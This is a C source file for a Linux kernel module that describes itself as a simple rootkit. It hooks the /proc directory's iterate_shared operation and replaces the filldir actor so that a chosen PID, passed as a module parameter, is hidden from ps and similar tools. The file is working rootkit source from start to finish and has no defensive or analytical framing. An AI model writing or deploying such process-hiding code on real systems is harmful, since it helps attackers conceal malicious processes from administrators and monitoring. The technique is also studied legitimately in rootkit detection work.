/**
 * This module is a simple and naive rootkit. It takes process pid as parameter
 * and hides it from the user.
 */

#include "linux/fs.h"
#include "linux/module.h"

MODULE_DESCRIPTION("Module for hiding a process from ps command");
MODULE_AUTHOR("nuhakala");
MODULE_LICENSE("GPL");

#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

// Module parameters
static char *target_pid = "1";
module_param(target_pid, charp, 0660);
MODULE_PARM_DESC(target_pid, "Pid to hide");

int (*original_iterate_shared)(struct file *f, struct dir_context *dc);
bool (*original_filldir_t)(struct dir_context *dc, const char *first,
			   int second, loff_t third, u64 fourth,
			   unsigned fifth);
struct dir_context *original_dc;
const struct file_operations *original_fops;
struct file_operations my_fops;
int is_initialized = 0;

bool my_filldir_t(struct dir_context *dc, const char *name, int namelen,
		  loff_t loff, u64 ino, unsigned type)
{
	// If the name of the folder is our target, do nothing
	if (strcmp(name, target_pid) == 0) {
		dc->pos++;
		return false;
		// otherwise proceed as normal
	} else {
		return original_filldir_t(dc, name, namelen, loff, ino, type);
	}
}

// Here we just replace the original dc with my slightly modified one.
int my_iterate_shared(struct file *file, struct dir_context *ctx)
{
	// save original value
	original_filldir_t = ctx->actor;

	// Inject our function
	ctx->actor = my_filldir_t;
	// Execute the normal stuff
	bool res = original_iterate_shared(file, ctx);
	// Put original function back
	ctx->actor = original_filldir_t;
	return res;
}

/* Init function */
static int __init my_init(void)
{
	pr_info("nuhakala saapuu!!!\n");

	struct file *target = filp_open("/proc", 0, 0000);

	// store original values
	original_iterate_shared = target->f_inode->i_fop->iterate_shared;
	original_fops = target->f_inode->i_fop;

	// set my_fops
	my_fops = *target->f_inode->i_fop; // Copy original
	my_fops.iterate_shared =
		&my_iterate_shared;        // replace original iterate_shared
	target->f_inode->i_fop = &my_fops; // inject my fops

	filp_close(target, target->f_owner.pid);

	return 0;
}
module_init(my_init);

/* Exit function */
static void __exit exit_module(void)
{
	struct file *target = filp_open("/proc", 0, 0000);

	// restore original value
	target->f_inode->i_fop = original_fops;
	// We have to also restore the fops to the file, because otherwise it
	// crashes. It propably does some checks under the hood, which causes
	// the crash. If the fops are different to the inode and file.
	target->f_op = original_fops;

	filp_close(target, target->f_owner.pid);
	pr_info("nuhakala poistuu!\n");
}
module_exit(exit_module);
